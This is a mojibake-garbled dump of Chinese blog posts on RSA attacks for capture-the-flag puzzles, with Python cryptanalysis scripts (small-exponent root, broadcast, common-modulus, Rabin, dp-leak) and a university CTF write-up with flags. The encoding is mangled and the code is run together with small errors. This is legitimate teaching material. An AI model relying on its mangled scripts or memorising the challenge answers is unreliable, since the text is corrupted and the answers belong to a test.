gmpy2è¿™é‡Œä¸»è¦æ˜¯ç”¨äºå®ƒçš„å¼€æ–¹åŠŸèƒ½ã€‚å³ï¼šcå»å¼€eæ¬¡æ–¹ï¼ˆe&#x3D;65537ï¼‰ 123456import gmpy2from Crypto.Util.number import *data = open(&#x27;rsa_16m&#x27;, &#x27;r&#x27;).read().split(&#x27;\\n&#x27;)m = gmpy2.iroot(int(data[1][4:], 16), int(data[2][4:], 16))[0]print(long_to_bytes(m)) #æ³¨æ„pythonç¯å¢ƒé…ç½® pip3 install gmpy2 pip3 install Crypto tips: ä¸€äº›æŠ€å·§exp() æ–¹æ³•è¿”å›xçš„æŒ‡æ•°,exã€‚ ä»¥ä¸‹æ˜¯ exp() æ–¹æ³•çš„è¯­æ³•: 123import mathmath.exp( x ) log() è¿”å› x çš„è‡ªç„¶å¯¹æ•°ã€‚ ä»¥ä¸‹æ˜¯ log() æ–¹æ³•çš„è¯­æ³•: 123import mathmath.log(x[, base]) æ³¨æ„ï¼šlog()æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®çš„ï¼Œéœ€è¦å¯¼å…¥ math æ¨¡å—ï¼Œé€šè¿‡é™æ€å¯¹è±¡è°ƒç”¨è¯¥æ–¹æ³•ã€‚ å‚æ•° x â€“ æ•°å€¼è¡¨è¾¾å¼ã€‚ base â€“ å¯é€‰ï¼Œåº•æ•°ï¼Œé»˜è®¤ä¸º eã€‚ $$ed\\equiv 1 mod \\varphi(n)$$ $$m^e mod n \\equiv c$$","categories":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://gryffinbit.top/tags/RSA/"}],"author":"Gryffinbit"},{"title":"RSA","slug":"RSA","date":"2020-11-13T16:47:42.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2020/11/14/RSA/","permalink":"https://gryffinbit.top/2020/11/14/RSA/","excerpt":"","text":"å‚æ•°Nï¼šå¤§æ•´æ•°Nï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºæ¨¡æ•°ï¼ˆmodulusï¼‰ p å’Œ q ï¼šå¤§æ•´æ•°Nçš„ä¸¤ä¸ªå› å­ï¼ˆfactorï¼‰ e å’Œ dï¼šäº’ä¸ºæ¨¡åæ•°çš„ä¸¤ä¸ªæŒ‡æ•°ï¼ˆexponentï¼‰ c å’Œ mï¼šåˆ†åˆ«æ˜¯å¯†æ–‡å’Œæ˜æ–‡ &#123;N,e&#125;ç§°ä¸ºå…¬é’¥,&#123;N,d&#125;ç§°ä¸ºç§é’¥ è§£é¢˜æ€è·¯ é€‰å–ä¸¤ä¸ªè¾ƒå¤§çš„äº’ä¸ç›¸ç­‰çš„è´¨æ•°på’Œqï¼Œè®¡ç®—n &#x3D; p * q ã€‚ è®¡ç®—phi &#x3D; (p-1) * (q-1) ã€‚ é€‰å–ä»»æ„eï¼Œä½¿å¾—eæ»¡è¶³ 1&lt;e&lt;phi ä¸” gcd(e , phi) &#x3D;&#x3D; 1 ã€‚ è®¡ç®—eå…³äºnçš„æ¨¡é€†å…ƒdï¼Œ å³dæ»¡è¶³(e * d)% n &#x3D;&#x3D;1 ã€‚ åŠ è§£å¯†ï¼šc &#x3D; (m ^ e) % n ï¼Œ m &#x3D; (c ^ d) % n ã€‚å…¶ä¸­mä¸ºæ˜æ–‡ï¼Œcä¸ºå¯†æ–‡ï¼Œ(n,e)ä¸ºå…¬é’¥å¯¹ï¼Œdä¸ºç§é’¥ï¼Œè¦æ±‚ 0 &lt;&#x3D; m &lt; n ã€‚ tipsï¼š å¦‚æœæ‰€ç»™ä¸ºå¤šä¸ªNï¼Œä½¿ç”¨å…¬å› æ•°æ”» å½“Eä¸º1ï¼Œ2æˆ–ç‰¹åˆ«å¤§æ—¶ï¼Œä½¿ç”¨Rabinæ”»å‡»æˆ–ä½è§£å¯†æŒ‡æ•°æ”»å‡» å½“Eä¸º3æ—¶ï¼Œå¦‚æœåªç»™å‡ºä¸€ç»„æ˜å¯†æ–‡ã€‚ä½¿ç”¨ä½åŠ å¯†æŒ‡æ•°æ”»å‡»ï¼Œå¦‚æœç»™å‡ºå¤šç»„æ˜å¯†æ–‡ï¼Œä½¿ç”¨ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡» å¦‚æœæ‰€ç»™ä¸ºå¤šæ¬¡åŠ å¯†ï¼Œä½¿ç”¨åŒä¸ªNï¼Œä½¿ç”¨å…±æ¨¡æ”»å‡» gmpy2 å¤§æ•°åº“çš„å®‰è£…1234brew install libmpcpip install gmpy2python3.8 xxx.py RSAçš„æ”»å‡»æ‰‹æ®µæ±‚è§£é€†å…ƒ12import gmpy2print (gmpy2.invert(47,30)) åˆ†è§£n12pip install factordb-pyclifactordb nçš„å€¼ æ±‚è§£å‡ºpã€q http://factordb.com/ ä¹Ÿå¯ä»¥æ±‚è§£ å·²çŸ¥p,q,eï¼Œè·å–dï¼ˆä¾‹å­ï¼‰123456789import gmpy2p =gmpy2.mpz(336771668019607304680919844592337860739)q =gmpy2.mpz(296173636181072725338746212384476813557)e =gmpy2.mpz(65537)phi_n= (p - 1) * (q - 1)d = gmpy2.invert(e, phi_n)print(&quot;d is:&quot;)print (d) å·²çŸ¥N,e,cï¼Œæ±‚m1234567891011121314import gmpy2p = 336771668019607304680919844592337860739q = 296173636181072725338746212384476813557e = 65537c = 55907434463693004339309251502084272273011794908408891123020287672115136392494n = p * qfn = (p - 1) * (q - 1)d = gmpy2.invert(e, fn)h = hex(gmpy2.powmod(c, d, n))[2:]if len(h) % 2 == 1: h = &#x27;0&#x27; + hs = h#s = h.decode(&#x27;hex&#x27;)print (s) å·²çŸ¥N,e,cï¼Œæ±‚m å‡ºé¢˜äººä¼šç»™ä½ ä¸€ä¸ªå…¬é’¥æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯ä»¥.pemæˆ–.pubç»“å°¾çš„æ–‡ä»¶ï¼‰å’Œå¯†æ–‡ï¼ˆé€šå¸¸å«åšflag.encä¹‹ç±»çš„ï¼‰ï¼Œä½ éœ€è¦åˆ†æå…¬é’¥ï¼Œæå–å‡ºï¼ˆNï¼Œeï¼‰ï¼Œé€šè¿‡å„ç§æ”»å‡»æ‰‹æ®µæ¢å¤ç§é’¥ï¼Œç„¶åå»è§£å¯†å¯†æ–‡å¾—åˆ°flagã€‚ EG:ä¸€èˆ¬å…ˆç”¨opensslæå–å…¬é’¥æ–‡ä»¶ä¸­çš„Nå’Œeã€‚ openssl rsa -pubin -text -modulus -in public.pem 12345678910111213import gmpy2p = 336771668019607304680919844592337860739q = 296173636181072725338746212384476813557e = 65537f = int(open(&#x27;flag.enc&#x27;, &#x27;rb&#x27;).read().encode(&#x27;hex&#x27;), 16)print fn = p * qfn = (p - 1) * (q - 1)d = gmpy2.invert(e, fn)h = hex(gmpy2.powmod(f, d, n))[2:]if len(h) % 2 == 1: h = &#x27;0&#x27; + hprint (h) ä½æŒ‡æ•°æ”»å‡» eçš„é€‰å–å¾ˆå° eçš„é€‰å–å¾ˆå°1234567891011import gmpy2e = 3n= 22885480907469109159947272333565375109310485067211461543881386718201442106967914852474989176175269612229966461160065872310916096148216253429849921988412342732706875998100337754561586600637594798877898552625378551427864501926224989873772743227733285336042475675299391051376624685754547818835551263597996620383338263448888107691240136257201191331617560711786674975909597833383395574686942099700631002290836152972352041024137872983284691831292216787307841877839674258086005814225532597955826353796634417780156185485054141684249037538570742860026295194559710972266059844824388916869414355952432189722465103299013237588737c= 15685364647213619014219110070569189770745535885901269792039052046431067708991036961644224230125219358149236447900927116989931929305133870392430610563331490276096858863490412102016758082433435355613099047001069687409209484751075897343335693872741print (&#x27;n=&#x27;, n)print (&#x27;c=&#x27;, c)print (&#x27;[+]Detecting m...&#x27;)result = gmpy2.iroot(c, 3)print (&#x27; [-]The c has cubic root?&#x27;, result[1])if result[1]: print (&#x27; [-]The m is:&#x27;, &#x27;&#123;:x&#125;&#x27;.format(result[0]) #print (&#x27; [-]The m is:&#x27;, &#x27;&#123;:x&#125;&#x27;.format(result[0]).decode(&#x27;hex&#x27;))print (&#x27;[!]All Done!&#x27;) mçš„ 3 æ¬¡æ–¹æ¯”Nå¤§ï¼Œä½†ä¸è¶³å¤Ÿå¤§1234567891011121314151617import gmpy2, timee = 3n = 114976915747243387792157708464120735018971336213935438953074748276198282761939060395482051056351068439137722626185590043024556656813730840050547350912425438364703854627760482842307943026011880815011654341047422453012558617703411700393668892701036222135444420377515575624398723436532681305293727164639582093389c = 5828813410620741112500628876643872258919868379601617907887884191584237969605489971465692568848339200057188383649365078832766143513766368216471491824042974016773526107276856706832404477882581400769791378958901067683158857990261489285951805740071223765359992165262854641069674603160977034446644199945940251030i = 239000000 print (&#x27;n=&#x27;, n)print (&#x27;c=&#x27;, c)print (&#x27;[!]Done!\\n&#x27;)print (&#x27;[+]Detecting m...&#x27;)s = time.process_time()while 1: m, b = gmpy2.iroot(c + i * n, 3) if b: print (&#x27; [-]m is: &#x27; + &#x27;&#123;:x&#125;&#x27;.format(int(m))) break #print &#x27; [-]i = %d\\r&#x27; % i, i += 1print (&#x27;[!]Timer:&#x27;, round(time.process_time() - s, 2), &#x27;s&#x27;) é€‰å–çš„åŠ å¯†æŒ‡æ•°è¾ƒä½ï¼Œå¹¶ä¸”ä½¿ç”¨äº†ç›¸åŒçš„åŠ å¯†æŒ‡æ•° ç»™äº†ä¸‰ç»„åŠ å¯†çš„å‚æ•°å’Œæ˜å¯†æ–‡ï¼Œå…¶ä¸­é¢˜ç›®å¾ˆæ˜ç¡®åœ°èƒ½å‘Šè¯‰ä½ è¿™ä¸‰ç»„çš„æ˜æ–‡éƒ½æ˜¯ä¸€æ ·çš„ 12345678910111213141516171819202122import gmpy2import timefrom functools import reducedef CRT(items): N = reduce(lambda x, y: x * y, (i[1] for i in items)) result = 0 for a, n in items: m = N / n d, r, s = gmpy2.gcdext(n, m) if d != 1: raise Exception(&quot;Input not pairwise co-prime&quot;) result += a * s * m return result % N, N# Ã¨Â¯Â»Ã¥â€¦Â¥ e, n, c e = 9n = [142782424368849674771976671955176187834932417027468006479038058385550042422280158726561712259205616626939123504489410624745195777853423961104590708231562726165590769610040722589287393102301338152085670464005026301781192671834390892019478189768725018303217559795377795540494239283891894830166363576205812991157,153610425077816156109768509904751446801233412970601397035720458311275245730833227428213917577405780162151444202393431444812010569489900435979730559895340377469612234558042643742219128033827948585534761030527275423811282367831985007507137144308704413007806012914286105842311420933479771294576841956749281552971,152540067782701001222493009941492423063369171831039847414320547494725020441901272486665728360741395415762864872737675660423920609681185809510355937534756399208661762715484879562585724584849261266873624875852300611683382543315580370484972470694466195837255994159609193239840228218925381488410059939975556977947,125842716702134814646356078531900645012495638692517778270527426844383063904041812273637776798591687732598509470005151551320457132061693618473039437320011446697406190781306264437609046721508738109650829547010385875425097336266103994639126319889016342284747700714199556143378526590058467791687837422897022829661,116144389285266462769913139639175922392318396923181100785008570884082681963637784423143843845816350379438789947802939701820129805341796427821894273985551331666719808355412080909245720551238149511778060242720419584504473490216670437024863860559347959698828131475160058721701582089480924088773887932997353631767,127833907448946785858374094953899556339175475846831397383049660262333005992005484987913355932559627279178940862787593749842796469355336182379062826441222705075178971785791223706944120681105575965622931327112817747065200324610697178273898956820957640413744954233327851461318200323486469677469950386824833536523,130561613227079478921314550968562766645507834694262831586725464124109153306162445639759476845681271537955934718244296904503168256991962908095007040044300188572466395275317838178325500238288302672390013747102961340256309124310478931896245221622317302428447389760864327859640573452084295225059466376349115703119,115953389401040751013569404909249958538962411171147823610874077094621794755967854844224923689925397631692572916641171075740839099217316101334941033937183815345038898177087515909675028366437302462022970987947264115373697445950951595479758872029099661065186221250394358255523574834723958546450323357472451930993,143437107845384843564651522639125300763388830136500260725097766445883003928355325003575359566631064630487365774344508496878731109174874449170057678821440711511966073934025028100604234445470976333825866939923998344367645612128590820812489407412175198698290167077116185959180877334222693344630253253476594907313]c = [85033868418784308573673709960700777350314426427677627319697346811123742342359072170220428874952996988431950989321281905284522596263957356289624365171732095210045916218066135140320107686084053271623461104022705353814233772164502775939590711842361956121603943483040254727995655776263673058788416722141673409688,66065963470666895005407449599703926269325406456711861190876894466341571726360462706664546294453572319565476664348345756905411939632955966517708138047546806602828064213238537646393524578984547577761559965654539771172357089802682793169968961304179886652390277814477825753096636750388350662980872556701402397564,116011740820520887443111656288411611070614127688662643257265381793048354928820176624229624692124188995846076431510548507016903260774215950803926107831505634778278712070141663189086436127990584944132764896694777031370995058271038329228336417590284517922855284619653301817355115583540545182119702335431334401666,97640420284096094887471273365295984332267897927392169402918423863919914002451127544715668846623138003564829254309568918651163254043205129883843425179687841236818720463784828905460885026290909768599562386370732119591181513319548915478512030197629196018254041500662654260834562708620760373487652389789200792120,8112507653841374573057048967617108909055624101437903775740427861003476480616929517639719198652146909660899632120639789106782550275648578142883715280547602249589837441805676364041484345030575130408744621981440093280624046635769338568542048839419939250444929802135605724150484414516536378791500915047844188300,36792148360808115566234645242678223867680969786675055638670907933041180936164293809961667801099516457636164692292891528415720085345494773373966277807505798679784807614784581861287048096977968620964436947452527540958289441390882589051225367658014709290392321808926567572528170531844664734909469690750971883323,53043093283305492238903255767698153246673671181809989362223466090875767705978690531154079519999671834688647277179370374802495005937892824566602423646978168777735383632928274082669949750078161820002768640908750005814934158829006019656592134357897586040866207754535586785064545866404380204728594863102313407789,88499407133762624445946519155722583633934260410706930537441122463087556094734626189377091740335667052378955691250910459790202385799502439716173363179773811920751410726795431402796346647688144853156900427797933862087074385441977254140336390678022955770879265490567987868532251217565094093318626424653599450992,138337520305048557335599940473834485492131424901034295018189264168040969172072024612859307499682986987325414798210700710891033749119834960687318156171051379643844580970963540418974136891389303624057726575516576726845229494107327508855516437230240365759885913142671816868762838801720492804671259709458388192984]print (&#x27;[+]Detecting m...&#x27;)data = zip(c, n)x, n = CRT(data)realnum = gmpy2.iroot(gmpy2.mpz(x), e)[0].digits()print (&#x27; [-]m is: &#x27; + &#x27;&#123;:x&#125;&#x27;.format(int(realnum)))print (&#x27;[!]All Done!&#x27;) ###ä½è§£å¯†æŒ‡æ•°æ”»å‡» eç‰¹åˆ«å¤§ å…±æ¨¡æ”»å‡» ç›¸åŒçš„æ¨¡Nå¯¹ç›¸åŒçš„æ˜æ–‡mè¿›è¡Œäº†åŠ å¯†ã€‚è‹¥å¹²æ¬¡åŠ å¯†ï¼Œeä¸åŒï¼ŒNç›¸åŒï¼Œmç›¸åŒã€‚ 12345678910111213141516171819202122232425import timeimport gmpy2n = 158052722013789461456896900244510199169216575693048895162538548356466884311543740968048825149608833390255268602486435690724338965409521812963337715301197225841194835534751041470231293288252951274190599189716955573428884560130364021535005115652592074445852835422027406556727605302404510264249211145063332337043e = [665213, 368273]c = [16698617641888248664694980135332125531792692516788088682722832061393117609508765284473236240256421599515450690670639565968165473479697383505401285976148490839526672808730165847471005704945978274496508928460578173068717106075169723401049489389383596761956301440156581021583368058047939083755488885694261340425, 59192887933967939708054321952273893559113509451228797382728687616356609407020086787061368452871936378934964292805289941535766263083244529814852043063188312786173717046316177403357053871483983775362121186037776932260378728059531236711960979620603784044468207000654149190295060179235411429700710154759043236436]print (&#x27;[+]Detecting m...&#x27;)time.process_time()c1 = c[0]c2 = c[1]e1 = e[0]e2 = e[1]s = gmpy2.gcdext(e1, e2)s1 = s[1]s2 = s[2] if s1 &lt; 0: s1 = -s1 c1 = gmpy2.invert(c1, n)elif s2 &lt; 0: s2 = -s2 c2 = gmpy2.invert(c2, n)m = pow(c1, s1, n) * pow(c2, s2, n) % nprint (&#x27; [-]m is:&#x27; + &#x27;&#123;:x&#125;&#x27;.format(int(m)))print (&#x27;\\n[!]Timer:&#x27;, round(time.process_time(),2), &#x27;s&#x27;)print (&#x27;[!]All Done!&#x27;) Rabinæ”»å‡» å½“e&#x3D;2æ—¶ 1234567891011121314151617181920212223242526import gmpy2import stringfrom Crypto.PublicKey import RSA# è¯»å–å…¬é’¥å‚æ•° with open(&#x27;./tmp/pubkey.pem&#x27;, &#x27;r&#x27;) as f: key = RSA.importKey(f) N = key.n e = key.e p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239with open(&#x27;./tmp/flag.enc&#x27;, &#x27;r&#x27;) as f: cipher = f.read().encode(&#x27;hex&#x27;) cipher = string.atoi(cipher, base=16) # print cipher # è®¡ç®—ypå’Œyq yp = gmpy.invert(p,q)yq = gmpy2.invert(q,p)# è®¡ç®—mpå’Œmq mp = pow(cipher, (p + 1) / 4, p)mq = pow(cipher, (q + 1) / 4, q)# è®¡ç®—a,b,c,d a = (yp * p * mq + yq * q * mp) % Nb = N - int(a)c = (yp * p * mq - yq * q * mp) % Nd = N - int(c)for i in (a,b,c,d): s = &#x27;%x&#x27; % i if len(s) % 2 != 0: s = &#x27;0&#x27; + s print (s) e&#x3D;112345678910111213141516import binasciiimport gmpy2N_hex=0x180be86dc898a3c3a710e52b31de460f8f350610bf63e6b2203c08fddad44601d96eb454a34dab7684589bc32b19eb27cffff8c07179e349ddb62898ae896f8c681796052ae1598bd41f35491175c9b60ae2260d0d4ebac05b4b6f2677a7609c2fe6194fe7b63841cec632e3a2f55d0cb09df08eacea34394ad473577dea5131552b0b30efac31c59087bfe603d2b13bed7d14967bfd489157aa01b14b4e1bd08d9b92ec0c319aeb8fedd535c56770aac95247d116d59cae2f99c3b51f43093fd39c10f93830c1ece75ee37e5fcdc5b174052eccadcadeda2f1b3a4a87184041d5c1a6a0b2eeaa3c3a1227bc27e130e67ac397b375ffe7c873e9b1c649812edcde_hex=0x1c_hex=0x4963654354467b66616c6c735f61706172745f736f5f656173696c795f616e645f7265617373656d626c65645f736f5f63727564656c797dc_hex = gmpy2.mpz(c_hex)N_hex = gmpy2.mpz(N_hex)i = 0while i&lt;10: m_hex = hex(c_hex + gmpy2.mpz(hex(i))*N_hex) print(m_hex[2:]) try: print(binascii.a2b_hex(m_hex[2:]).decode(&quot;utf8&quot;)) except binascii.Error as e: print(&quot;ä½æ•°éå¶æ•°ï¼Œè·³è¿‡...&quot;) i += 1 éƒ¨åˆ†å‚æ•°æ³„éœ²123456789101112131415import gmpy2import binasciidef decrypt(dp,dq,p,q,c): InvQ = gmpy2.invert(q,p) mp = pow(c,dp,p) mq = pow(c,dq,q) m=(((mp-mq)*InvQ)%p)*q+mq print (binascii.unhexlify(hex(m)[2:]))p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852decrypt(dp,dq,p,q,c) dpæ³„éœ²1234567891011121314151617181920import gmpy2import binasciidef getd(n,e,dp): for i in range(1,e): if (dp*e-1)%i == 0: if n%(((dp*e-1)/i)+1)==0: p=((dp*e-1)/i)+1 q=n/(((dp*e-1)/i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi return de = 65537n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751d=getd(n,e,dp)m=pow(c,d,n)print (binascii.unhexlify(hex(m)[2:])) 123456789101112131415161718192021import gmpy2import binasciidef getd(n,e,dp): for i in range(1,e): if (dp*e-1)%i == 0: if n%(((dp*e-1)/i)+1)==0: p=((dp*e-1)/i)+1 q=n/(((dp*e-1)/i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi return de = 65537n = 156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847c = 108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869dp = 734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825d=getd(n,e,dp)m=pow(c,d,n)print (binascii.unhexlify(hex(m)[2:])) æŠ¥é”™No module named â€˜Cryptoâ€™12sudo pip3 uninstall cryptosudo pip3 uninstall pycrypto Then install the pycrypto module again using: 123sudo pip3 install pycryptosudo pip uninstall cryptosudo pip uninstall pycrypto Then install the pycrypto module again using: 1sudo pip install pycrypto module â€˜timeâ€™ has no attribute â€˜clockâ€™time.clock()æ¢æˆtime.process_time() â€˜mapâ€™ object is not subscriptable1ã€ä¸‹é¢è¯­å¥æŠ¥é”™python3 TypeError: â€˜mapâ€™ object is not subscriptable 1map(apply_filters_to_token, sentences) 2ã€ä¿®æ”¹ï¼Œadd â€œlistâ€ to map 1return list(map(apply_filters_to_token, sentences))","categories":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://gryffinbit.top/tags/RSA/"}],"author":"Gryffinbit"},{"title":"ç¬¬ä¸€å±Šä¿¡å®‰å¤§æŒ‘æˆ˜WP","slug":"ç¬¬ä¸€å±Šä¿¡å®‰å¤§æŒ‘æˆ˜WP","date":"2020-11-11T12:11:53.000Z","updated":"2024-11-12T07:00:18.000Z","comments":true,"path":"2020/11/11/ç¬¬ä¸€å±Šä¿¡å®‰å¤§æŒ‘æˆ˜WP/","permalink":"https://gryffinbit.top/2020/11/11/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98WP/","excerpt":"","text":"CDUTç¬¬ä¸€å±Šä¿¡å®‰å¤§æŒ‘æˆ˜Miscï¼ˆéƒ¨åˆ†ï¼‰ å’Œ Crypto çš„write up å¯†ç å­¦ crypto 1 é¢˜ç›®æè¿° modulusï¼š99742889480132178464693625265991467727088330702125690789109469022100733238623exponentï¼š65537è¯·æäº¤ç§é’¥æ³¨ï¼šç§é’¥ä¸ºåå…­è¿›åˆ¶ã€‚Flagæ ¼å¼ dino{0xâ€¦â€¦.} é¢˜è§£ å·²çŸ¥pã€qã€eæ±‚dçš„ç»å…¸RSAé¢˜å‹ é¦–å…ˆå°†æ¨¡æ•°Nï¼Œåˆ†è§£ä¸ºä¸¤ä¸ªå¤§ç´ æ•° pã€q 12pip install factordb-pyclifactordb nçš„å€¼ http://factordb.com/ ä¹Ÿå¯ä»¥æ±‚è§£ æ±‚è§£å‡ºpã€q 1234567891011# python3.8import gmpy2p =gmpy2.mpz(336771668019607304680919844592337860739)q =gmpy2.mpz(296173636181072725338746212384476813557)e =gmpy2.mpz(65537)phi_n= (p - 1) * (q - 1)d = gmpy2.invert(e, phi_n)print (&quot;d is:&quot;)print (d) å¾—åˆ°çš„dæ˜¯åè¿›åˆ¶ï¼Œå†è½¬æ¢ä¸ºåå…­è¿›åˆ¶ è¿›åˆ¶è½¬æ¢ï¼š 1234567891011121314151617181920212223242526272829303132333435print &quot;1: 10-&gt;2\\n2: 10-&gt;16\\n3: 2-&gt;10\\n4: 16-&gt;10\\n5: 16-&gt;2\\n6: 2-&gt;16\\n&quot;c =int( raw_input(&quot;Input your choice:&quot;)) # c = choose# 10-&gt;2if c == 1: print bin(int(raw_input(&quot;Input your number:&quot;))) # 10-&gt;16elif c == 2: print hex(int(raw_input(&quot;Input your number:&quot;))) # 2-&gt;10elif c ==3: print str(int(raw_input(&quot;Input your number:&quot;),2)) # 16-&gt;10elif c ==4: print str(int(raw_input(&quot;Input your number:&quot;),16)) # 16-&gt;2elif c == 5: s = str(int(raw_input(&quot;Input your number&quot;),16)) # s = step print bin(int(s)) # 2-&gt;16elif c ==6: st = str(int(raw_input(&quot;Input your number:&quot;),2)) print hex(int(st)) Flag dino{0xb010bd96058b2972f5778c95fb8b8614406666727a4e4bda1338aa299b219e71} crypto 2 é¢˜ç›®æè¿° ä¸˜æ¯”ç‰¹æ˜¯ä¸€ä½è‹±ä¿Šå„’é›…çš„è‹±å›½ç»…å£«ï¼Œä»–çš„å¦»å­åŸƒå°”è¥¿æ˜¯ä¸€ä½ç¾å›½æ·‘å¥³ã€‚ä¸¤äººçš„å©šå§»ç”Ÿæ´»ååˆ†ç¾æ»¡ï¼Œç›´åˆ°ä¸€ç³»åˆ—ç¥ç§˜ä¿¡æ¯çš„åˆ°æ¥æ”¹å˜äº†ä¸€åˆ‡ã€‚flagæ ¼å¼ï¼šdino{} é¢˜ç›®ä¸‹è½½é“¾æ¥ï¼šhttps://gryffinbit.lanzous.com/ibQUciae1zi é¢˜è§£ å¼€å±€ä¸€å¼ gifï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šå›¾ç‰‡é—ªè¿‡ã€‚æƒ³åŠæ³•æŠŠgifåˆ†è§£æˆä¸€å¼ ä¸€å¼ çš„ï¼Œå¯ä»¥æ‰¾ç½‘ç«™æ‰¾è½¯ä»¶æ‰¾å„ç§å·¥å…·ã€‚ ä¾‹å¦‚æ‹–è¿›PhotoShopï¼š å¯ä»¥çœ‹åˆ°å›¾å±‚è¢«åˆ†è§£ï¼Œç„¶åå¯¹ç…§è¡¨è§£å¯†ï¼š å¾—åˆ°å¯†æ–‡ï¼šTHEDANCINGPEOPLE dino{THEDANCINGPEOPLE} crypto 3 é¢˜ç›®æè¿° å¯†æ–‡ï¼šiuf_xat_hmoz_gocwmx é¢˜è§£ å¯†æ–‡ï¼šiuf_xat_hmoz_gocwmx Playfair cipheræ˜¯ä¸€ç§ä½¿ç”¨ä¸€ä¸ªå…³é”®è¯æ–¹æ ¼æ¥åŠ å¯†å­—ç¬¦å¯¹çš„åŠ å¯†æ³•ã€‚å®ƒä¾æ®ä¸€ä¸ª5*5çš„æ­£æ–¹å½¢ç»„æˆçš„å¯†ç è¡¨æ¥ç¼–å†™ï¼Œå¯†ç è¡¨é‡Œæ’åˆ—æœ‰25ä¸ªå­—æ¯ã€‚å¦‚æœä¸€ç§è¯­è¨€å­—æ¯è¶…è¿‡25ä¸ªï¼Œå¯ä»¥å»æ‰ä½¿ç”¨é¢‘ç‡æœ€å°‘çš„ä¸€ä¸ªã€‚å¦‚ï¼Œæ³•è¯­ä¸€èˆ¬å»æ‰wæˆ–kï¼Œå¾·è¯­åˆ™æ˜¯æŠŠiå’Œjåˆèµ·æ¥å½“æˆä¸€ä¸ªå­—æ¯çœ‹å¾…ã€‚è‹±è¯­ä¸­zä½¿ç”¨æœ€å°‘ï¼Œå¯ä»¥å»æ‰å®ƒã€‚ å›¾ç‰‡key.jpgæ˜¯å°æé¾™dinoï¼Œå¯†é’¥keyå°±æ˜¯dinoã€‚ å¯ä»¥æ‰‹å†™ç®—å‡ºå¯†ç ï¼Œæˆ–è€…ç”¨åœ¨çº¿ç½‘ç«™è§£å¯†ï¼šhttp://rumkin.com/tools/cipher/playfair.php flagæ ¼å¼ï¼šdino{} dino{are_you_play_fairly} crypto 4 é¢˜ç›®æè¿° ğŸµâ€œæˆ‘æ˜¯ä¸€ä¸ªé…’ç²¾è¿‡æ•çš„å¸…å“¥ï¼Œæˆ‘çš„é…’å“çˆ†å·®ï¼Œä½†æ˜¯æˆ‘çˆ†çˆ±å–ã€‚ I got drunk drunk drunk drunk æˆ‘æ˜¯ç™¾å˜é…’ç²¾ï¼Œä¸æ˜¯ç™¾å˜å°æ¨±ã€‚I got drunk drunk drunk drunk ä»Šæ™šæˆ‘è¦å‡ºé—¨ é…’å±€ä½ å¾—å°å¿ƒasmekusfkxjykebqmmsyvsbklsgkhsynkgjfphjlpjhljzqcqzfqyxqhfkiqfsxedglfkvdquzkmrsdtgsxajykmzkyjfeqyzkmrszjulmszhtzfjfhfjkyejlbsdzkcfsyckhyxjyysazlqlsdzbsdsjzfbscmqvxjyklhoomsâ€œ æ³•è€å¯èƒ½é…’ç²¾ä¸­æ¯’äº†ï¼Œèƒ¡è¨€ä¹±è¯­äº†ã€‚Flagæ ¼å¼ï¼šflag{} æ³¨ï¼šæ²¡æœ‰ç©ºæ ¼ é¢˜è§£ è¯é¢‘åˆ†æé¢˜ https://quipqiup.com/ welcome to dino challenge hope you enjoy it quipqiup is a fast and automated cryptogram solver by Edwin Olson It can solve simple substitution ciphers often found in newspapers here is the flag dino puzzle flag{dinopuzzle} crypto 5 é¢˜ç›®æè¿° e(m)&#x3D;7m+21(mod26)å¯†æ–‡ï¼šrxjfkzyhflagæ ¼å¼ï¼šdino{} é¢˜è§£ ä»¿å°„å˜æ¢ã€‚ dino{security} crypto 6 é¢˜ç›®æè¿° +21 +6 +1 +8flagæ ¼å¼: dino{} é¢˜è§£ é¢˜ç›®ä¸‹è½½é“¾æ¥ï¼šhttps://gryffinbit.lanzous.com/i3Ejohp95wd ä»64å‡ºå‘,+21 +6 +1 +8 